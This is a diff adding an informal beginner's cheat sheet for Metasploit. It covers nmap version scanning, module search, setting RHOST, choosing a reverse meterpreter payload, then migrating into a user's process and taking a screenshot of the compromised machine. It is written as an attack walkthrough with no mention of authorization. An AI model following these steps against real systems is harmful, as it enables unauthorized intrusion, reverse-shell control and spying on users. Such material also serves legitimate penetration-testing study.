@@ -1,0 +1,61 @@
+use this if you ever get stumped when youre trying to run an exploit on metasploit:
+
+after you find a port thats open you want to find out what specific versions of the services that are open by using -sV in nmap
+
+once in metasploit framework:
+you can use:
+msf6 > search <service>
+or
+msf6 > grep scanner <service>
+
+then to use the exploit you will type:
+msf6 > use <full/path/to/exploit/for/service>
+
+now use:
+msf6 > show options
+
+and then:
+msf6 > set RHOST <vuln_IP>
+
+now complete the test by running:
+
+msf6 > run
+
+Now based on these results you will now the likelyhood that the device that IP address is linked to is vulnerable to any exploits of the running service.
+
+after this is discovered and it says that it is likely vulnerable to an attack on that service and port you will just enter this time:
+
+msf6 > grep exploit search <service>
+
+in the results you can skim and try to find an exploit that will directly allow you to launch an attack to the service running on the machine.
+
+to do so you will just enter(or copy and paste from the query results):
+
+msf6 > use <full/path/to/exploit/for/service>
+
+and then just like before you will use:
+
+msf6 > show options
+
+the main option you will always need to set is the 'RHOST' and to do that you will just enter:
+
+msf6 > set RHOST <vuln_IP>
+
+now you will need to set the payload you will be using by typing:
+
+msf6 > set payload <vuln_sys_OS>/|TAB will show you all payloads available to use|
+*ex.
+	msf6 > set payload windows/meterpreter/rever_http
+	msf6 > show options
+	msf6 > set LHOST
+	**this is only needed if it did not automatically set the LHOST usually it does this step for you**
+
+then once a session is opened on the vulnerable system you will just need to be sure to migrate the shell or attack into another service on the system to do that you will:
+	
+meterpreter > ps
+**this will just show you a list of all the currently running service on the system
+meterpreter > migrate <PID of a process that is being ran currently by a user on the system>
+
+meterpreter > screenshot
+**this is an example of the capabilites of your reverse shell, this command just saves a screenshot of the desktop for the infected device.
+
